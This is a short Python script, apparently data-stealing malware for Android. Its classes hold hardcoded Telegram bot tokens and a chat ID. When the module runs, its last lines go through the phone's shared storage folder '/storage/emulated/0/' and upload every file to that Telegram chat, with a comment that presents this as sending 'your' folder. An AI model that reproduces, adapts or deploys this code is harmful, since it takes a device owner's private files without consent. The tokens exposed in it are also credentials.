import requests
import os
#import requests
import schedule
import time
class loke_Hawkeye1:
    def __init__(self):
        
        self.token = '7032489814:AAGO8PR7yGm48X8JkHZNRnofi9ZFAVtxzQI'
        self.chat_id = '7020558505'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        

import os
import requests

class loke_Hawkeye2:
    def __init__(self, directory):
        self.token = '7414358509:AAEiNJHeEm5vaNe-M45hXkBQKwXUbzedACM'  # رمز الروبوت في تليجرام
        self.chat_id = '7020558505'  # معرف الدردشة الذي سيتم إرسال الرسائل/الملفات إليه
        self.directory = directory  # مسار المجلد الذي يحتوي على الملفات المراد إرسالها

    def telegram(self, message):
        """إرسال رسالة إلى دردشة تليجرام."""
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        return response

    def send_file(self, file_path):
        """إرسال ملف إلى دردشة تليجرام."""
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        data = {
            'chat_id': self.chat_id
        }
        with open(file_path, 'rb') as file:
            files = {'document': file}
            response = requests.post(url, data=data, files=files)
        return response

    def send_files_from_directory(self):
        """إرسال جميع الملفات من المجلد المحدد إلى دردشة تليجرام."""
        for filename in os.listdir(self.directory):
            file_path = os.path.join(self.directory, filename)
            if os.path.isfile(file_path):
                self.send_file(file_path)

# استخدام الفئة لإرسال الملفات من مجلد معين تلقائيًا
directory_path = '/storage/emulated/0/'  # حدد المسار إلى المجلد الخاص بك
bot = loke_Hawkeye2(directory_path)
bot.send_files_from_directory()